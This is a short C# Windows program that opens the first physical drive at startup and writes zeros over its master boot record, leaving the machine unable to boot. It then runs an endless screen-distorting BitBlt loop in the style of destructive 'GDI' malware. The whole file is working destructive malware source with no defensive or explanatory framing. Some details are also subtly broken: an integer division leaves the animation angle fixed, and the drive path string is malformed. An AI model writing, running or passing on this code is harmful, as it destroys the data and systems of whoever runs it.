using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing;

class Program
{
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop);

    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    static void OverwriteMBR()
    {
        byte[] mbrData = new byte[512];
        using (var fs = new System.IO.FileStream(@"\\.\\PhysicalDrive0", System.IO.FileMode.Open, System.IO.FileAccess.Write))
        {
            fs.Write(mbrData, 0, mbrData.Length);
        }
    }

    static void Main()
    {
        OverwriteMBR();

        SetProcessDPIAware();
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        IntPtr hdc = GetDC(IntPtr.Zero);
        int dx = 1;
        int dy = 1;
        double angle = 0;
        int size = 1;
        int speed = 5;

        while (true)
        {
            BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, 0xCC0020);
            dx = (int)Math.Ceiling(Math.Sin(angle) * size * 10);
            dy = (int)Math.Ceiling(Math.Cos(angle) * size * 10);
            angle += speed / 2000;
            if (angle > Math.PI)
            {
                angle = Math.PI * -1;
            }
            Thread.Sleep(10); // Adjust the delay for desired speed
        }
    }
}
